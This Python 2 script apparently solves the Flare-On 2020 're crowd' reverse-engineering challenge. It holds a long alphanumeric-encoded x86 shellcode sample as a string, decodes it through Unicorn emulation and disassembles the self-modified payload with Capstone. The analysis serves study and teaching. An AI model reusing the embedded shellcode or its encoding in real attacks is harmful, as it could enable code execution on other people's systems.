#!/usr/bin/env python2
# --------------------------------------------------------------------------------------------------
# Flare-On 2020: 7 - re crowd
# --------------------------------------------------------------------------------------------------
import struct
import base64
from capstone import *
from unicorn import *
from unicorn.x86_const import *


venetian_shellcode = (
    'VVYAIAIAIAIAIAIAIAIAIAIAIAIAIAIAjXAQADAZABARALAYAIAQAIAQAIAhAAAZ1AIAIAJ11AIAIABABABQ'
    'I1AIQIAIQI111AIAJQYAZBABABABABkMAGB9u4JBYlHharm0ipIpS0u9iUMaY0qTtKB0NPRkqBLLBkPRMDbk'
    'sBlhlOwGMzmVNQkOTlmlQQqllBLlMPGQVoZmjaFgXbIbr2NwRk1BzpDKmzOLtKPLjqqhJCa8za8QPQtKaImP'
    'IqgctKMyZxk3MjniRkMddKM16vnQYoVLfaXOjm9quwP8Wp0ul6LCqm9hOKamNDCEGtnxBkOhMTKQVs2FtKLL'
    'PKdKNxKlYqZ3tKLDDKYqXPdIq4nDnDokqKS1pY1Jb1yoK0Oo1OQJbkZrHkrmaMbHLsLrYpkPBHRWrSlraO1D'
    'S8nlbWmVkW9oHUtxV0M1IpypKyi4Ntb0bHNIu00kypioIENpNpPP201020a0npS8xjLOGogpIoweF7PjkUS8'
    'Upw814n5PhLBipjqqLriXfqZlPr6b7ph3iteadqQKOweCUEpd4JlYopN9xbUHl0hzPWEVBR6yofu0j9pQZkT'
    'qFR7oxKRyIfhoo9oHUDKp63QZVpKqH0OnrbmlN2JmpoxM0N0ypKP0QRJipphpX6D0Sk5ioGeBmDX9pkQ9pM0'
    'r3R6pPBJKP0Vb3B738KRxYFh1OIoHU9qUsNIUv1ehnQKqIomr5Og4IYOgxLPkPM0yp0kS9RLplaUT22V2UBL'
    'D4RUqbs5LqMbOC1Np1gPdjkNUpBU9k1q8oypm19pM0NQyK9rmL9wsYersPK2LOjbklmF4JztkWDFjtmObhMD'
    'Iwyn90SE7xMa7kKN7PYrmLywcZN4IwSVZtMOqxlTLGIrn4ko1zKdn7P0B5IppEmyBUjEaOUsAA')


SHELLCODE_START_ADDR = 0x401000


# --------------------------------------------------------------------------------------------------
def decode(data):
    return data.decode("utf-8").encode("utf-16le")


# --------------------------------------------------------------------------------------------------
def disassemble(code, start_addr):
    md = Cs(CS_ARCH_X86, CS_MODE_32)
    for insn in md.disasm(code, start_addr):
        return {
            'addr' : '%06Xh' % insn.address,
            'bytes': ' '.join('%02X' % x for x in code[:insn.size]),
            'mnem' : '%-6s %s' % (insn.mnemonic, insn.op_str)
        }


# --------------------------------------------------------------------------------------------------
def hook_code(mu, address, size, user_data):
    # Simply display various information about the instruction that is about to execute.
    eax = mu.reg_read(UC_X86_REG_EAX)
    ebx = mu.reg_read(UC_X86_REG_EBX)
    ecx = mu.reg_read(UC_X86_REG_ECX)
    edx = mu.reg_read(UC_X86_REG_EDX)
    esi = mu.reg_read(UC_X86_REG_ESI)
    edi = mu.reg_read(UC_X86_REG_EDI)
    esp = mu.reg_read(UC_X86_REG_ESP)
    ebp = mu.reg_read(UC_X86_REG_EBP)

    regs = 'EAX:%08X, EBX:%08X, ECX:%08X, EDX:%08X, ESI:%08X, EDI:%08X, ESP:%08X, EBP:%08X' % (
            eax, ebx, ecx, edx, esi, edi, esp, ebp)

    stack_bytes = mu.mem_read(esp, 16)
    stack = 'STACK:%s | %s' % (' '.join('%02X' % s for s in stack_bytes),
            ''.join(chr(s) if s >= 0x20 and s <= 0x7e else '.' for s in stack_bytes)),

    # Note: For some reason, stack is an 1-element array. I don't know why.
    stack = stack[0]

    # Read instruction bytes from emulated memory and disassemble them.
    insn_bytes = mu.mem_read(address, size)
    insn = disassemble(insn_bytes, address)

    print 'UC: %Xh %-20s %-38s ; %s, %s' % (address, insn['bytes'], insn['mnem'], regs, stack)


# --------------------------------------------------------------------------------------------------
def emulate(code, start_addr, end_addr, payload_len):
    print '[+] Emulating x86 shellcode ...'

    STACK_BASE = 0x00200000
    SEGM_LEN = 1 << 20

    try:
        # Initialize an x86 emulator.
        mu = Uc(UC_ARCH_X86, UC_MODE_32)

        # Allocate memory for shellcode and stack.
        mu.mem_map(start_addr & 0xFFFF0000, SEGM_LEN)
        mu.mem_map(STACK_BASE, SEGM_LEN)

        # Write shellcode to be emulated to memory.
        mu.mem_write(start_addr, code)

        # Initialize registers.
        mu.reg_write(UC_X86_REG_ESP, STACK_BASE + (SEGM_LEN >> 1))
        mu.reg_write(UC_X86_REG_ESI, start_addr)

        # Add a callback when an instruction is about to execute.
        mu.hook_add(UC_HOOK_CODE, hook_code)

        # Start emulation.
        mu.emu_start(start_addr, end_addr)

        print '[+] Emulation finished!'
    except UcError as e:
        print '[+] Unicorn Exception raised: %s' % e

    # Payload has been decoded (it's self modifying) by now. Read it from memory.
    decoded_payload = mu.mem_read(start_addr, payload_len)
    return decoded_payload 


# --------------------------------------------------------------------------------------------------
if __name__ == "__main__":
    print '[+] Flare-On 2020: 7 - re crowd'

    print '[+] Decoding shellcode ...'
    venetian_shellcode = decode(venetian_shellcode) 

    print '[+] Shellcode length: %d' % len(venetian_shellcode)


    # Ispo: I found thevalues of payload_len and end_addr, after some trial and error.
    SHELLCODE_START_ADDR = 0x401000
    payload_len = 0x27D
    end_addr = 0x4010F2
    payload = emulate(venetian_shellcode, SHELLCODE_START_ADDR, end_addr, payload_len)

    print '[+] Decoded payload (after self-modification):'

    # Disassemble the decoded payload.
    md = Cs(CS_ARCH_X86, CS_MODE_32)
    for insn in md.disasm(payload, SHELLCODE_START_ADDR):
        st = insn.address - SHELLCODE_START_ADDR
        asm = {
            'addr' : '%06Xh' % insn.address,
            'bytes': ' '.join('%02X' % x for x in payload[st:st+insn.size]),
            'mnem' : '%-6s %s' % (insn.mnemonic, insn.op_str)
        }

        print '%s %-20s %s' % (asm['addr'], asm['bytes'], asm['mnem'])

    print '[+] Program finished. Bye bye :)'

# --------------------------------------------------------------------------------------------------
